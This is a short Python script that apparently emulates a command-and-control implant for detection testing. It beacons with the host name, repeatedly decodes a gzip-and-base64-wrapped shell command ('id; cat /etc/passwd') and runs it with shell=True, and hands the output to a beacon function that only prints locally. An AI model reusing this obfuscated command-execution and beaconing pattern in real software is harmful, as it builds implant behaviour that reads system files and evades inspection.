import time, socket, subprocess, urllib.request as u, base64 as b, gzip

WORKER = "ai-sprint-poc-worker"
HOST_NAME = socket.gethostname()

def post_data_to_webhook(data):
    # Simulated C2 beaconing is emitted locally for detection validation.
    # No external network connection is performed.
    print(f"[!] Local C2 Beacon Emit: {data[:30]}...")

post_data_to_webhook(b"BEACON " + HOST_NAME.encode())
TIME_LIMIT = time.time() + 30 

while time.time() < TIME_LIMIT:
    print("[*] Polling C2 server for new commands...")
    
    # True Gzip and Base64 layering
    raw_command = b"id; cat /etc/passwd | head -n 2"
    compressed = gzip.compress(raw_command)
    fake_payload = b.b64encode(compressed) 
    
    try:
        # Decoding and shell execution
        cmd_output = subprocess.run(
            gzip.decompress(b.b64decode(fake_payload)), 
            shell=True, capture_output=True, timeout=5
        ).stdout
        post_data_to_webhook(cmd_output)
    except:
        pass
    time.sleep(7)